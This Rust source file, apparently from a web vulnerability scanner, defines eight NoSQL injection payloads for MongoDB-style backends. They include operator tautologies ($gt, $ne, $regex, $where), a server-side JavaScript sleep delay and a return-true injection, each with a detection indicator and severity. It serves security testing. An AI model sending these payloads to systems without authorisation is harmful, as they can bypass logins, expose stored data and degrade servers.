use crate::domain::active_vuln::{ExpectedIndicator, PayloadDefinition};
use crate::domain::entities::SeverityLevel;

pub fn get_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "nosqli_01".into(),
            payload: "{\"$gt\": \"\"}".to_string(),
            description: "NoSQL Injection: MongoDB tautology in JSON".to_string(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::High,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "nosqli_02".into(),
            payload: "|| 1==1".to_string(),
            description: "NoSQL Injection: Boolean OR evaluation".to_string(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::High,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "nosqli_03".into(),
            payload: "{\"$ne\": null}".to_string(),
            description: "NoSQL Injection: MongoDB Not Equal bypass".to_string(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::High,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "nosqli_04".into(),
            payload: "'; sleep(5000);'".to_string(),
            description: "NoSQL Injection: Server-side JS execution time delay".to_string(),
            expected_indicator: ExpectedIndicator::TimeDelay(4500),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "nosqli_05".into(),
            payload: "{\"$where\": \"this.password.match(/./)\"}".to_string(),
            description: "NoSQL Injection: MongoDB $where regex evaluation".to_string(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::High,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "nosqli_06".into(),
            payload: "{\"$regex\": \".*\"}".to_string(),
            description: "NoSQL Injection: MongoDB $regex match all".to_string(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::High,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "nosqli_07".into(),
            payload: "true, $where: '1 == 1'".to_string(),
            description: "NoSQL Injection: Parameter pollution $where".to_string(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::High,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "nosqli_08".into(),
            payload: "'; return true; var foo='".to_string(),
            description: "NoSQL Injection: SSJS boolean true".to_string(),
            expected_indicator: ExpectedIndicator::StatusCode(200),
            severity: SeverityLevel::High,
            safe_for_production: false,
        }
    ]
}
